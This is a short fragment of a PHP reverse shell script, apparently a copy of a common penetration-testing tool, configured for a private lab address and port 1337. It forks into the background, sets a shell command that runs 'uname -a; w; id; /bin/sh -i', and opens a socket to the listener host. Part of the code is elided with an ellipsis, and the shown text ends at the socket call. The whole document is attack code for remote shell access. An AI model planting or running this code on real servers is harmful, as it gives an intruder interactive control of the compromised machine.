<?php set_time_limit (0); $VERSION = "1.0"; 
$ip = '192.168.163.129';
$port = 1337;
$chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0;
if (function_exists('pcntl_fork')) { 	$pid = pcntl_fork(); 	if ($pid == -1) { printit("ERROR: Can't fork"); 	exit(1); 	}
	if ($pid) {		exit(0); }
...
chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30);
